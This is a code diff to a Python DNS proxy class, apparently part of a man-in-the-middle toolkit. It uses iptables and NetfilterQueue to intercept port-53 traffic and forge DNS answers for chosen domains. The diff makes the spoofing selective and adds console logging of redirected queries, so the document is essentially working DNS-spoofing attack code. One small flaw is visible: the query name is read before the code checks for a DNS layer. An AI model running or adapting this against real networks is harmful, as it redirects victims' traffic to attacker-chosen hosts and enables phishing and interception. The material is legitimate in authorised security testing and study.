@@ -38,26 +38,23 @@ class DnsProxy:
   def callback(self, packet):
             payload = packet.get_payload()
             pkt = IP(payload)
+            spoofed = self.config.getIPFromDomain(pkt[DNS].qd.qname)
             if not pkt.haslayer(DNSQR):
+                print("Port 53: Received something strange")
                 packet.accept()
             else:
-                new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.params.host_ip))
-                packet.set_payload(str(new_pkt))
-                packet.accept()        
-            '''
-            pkt = payload.get_payload()
-            spoofed = self.config.getIPFromDomain(pkt[DNS].qd.qname)
-            dns = pkt[UDP].payload
-            qname = dns[DNSQR].qname
-            print ('DNS ' + qname + " / ", end="")    
-            if spoofed:
-                print(WARNING + 'spoofed to ' + spoofed + END, end="")
-                pkt.set_payload(str(self.forge_reply(pkt, qname, spoofed)))
-            pkt.accept()
-            '''
+                if not spoofed:
+                    print("DNS from: {} --> {}".format(pkt[IP].src, pkt[DNSQR].qname))
+                    packet.accept()
+                else:
+                    new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoofed))
+                    packet.set_payload(str(new_pkt))
+                    print("DNS from: {} --> {} \033[94mspoofed to \033[1m{}\033[0m".format(pkt[IP].src, pkt[DNSQR].qname, spoofed))
+                    packet.accept()
+
   def dnsProxy(self):
         os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 4')   
         self.q = NetfilterQueue()
